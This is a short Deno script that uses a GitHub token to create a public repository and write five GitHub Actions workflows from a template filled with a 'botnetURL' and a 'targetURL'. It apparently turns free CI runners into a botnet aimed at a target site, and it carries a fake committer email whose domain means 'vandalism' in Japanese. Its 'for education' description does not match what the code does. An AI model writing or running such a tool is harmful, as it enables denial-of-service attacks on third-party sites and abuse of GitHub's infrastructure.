import { Octokit } from "https://esm.sh/octokit?dts";
import "https://deno.land/x/dotenv@v3.2.0/load.ts";

const { TOKEN, botnetURL, targetURL } = Deno.env.toObject();

const octokit = new Octokit({
  auth: TOKEN,
});

const botnet = await octokit.rest.repos.createForAuthenticatedUser({
  name: "test-" + Date.now().toString(36),
  private: false,
  description: "for education",
});

console.log("[!] Created");

const afterOwner = botnet.data.owner.login;
const afterRepo = botnet.data.name;

const array = Array.from({ length: 5 }).fill(0).map(async (_v, i) => {
  console.log("[!] Create reg-" + i);
  const workflow = await octokit.rest.repos.createOrUpdateFileContents({
    owner: afterOwner,
    repo: afterRepo,
    path: ".github/workflows/entry" + i + ".yml",
    message: "setup",
    content: btoa(
      (await Deno.readTextFile("./objects/index.yml")).replace(
        /{{base}}/g,
        "https://github.com/" + botnetURL,
      ).replace(/{{url}}/g, targetURL),
    ),
    committer: {
      name: `SetupBot`,
      email: "amex@荒らし.com",
    },
    author: {
      name: "SetupBot",
      email: "amex@荒らし.com",
    },
  });

  await new Promise((resolve) => setTimeout(resolve, 100));

  return workflow.data.content?.path;
});

console.log("[!] Writed Action");

console.log("[!] Start setup");

// run workflow

array.forEach(async (_v, i) => {
  console.log("[!] Run " + await _v);
});
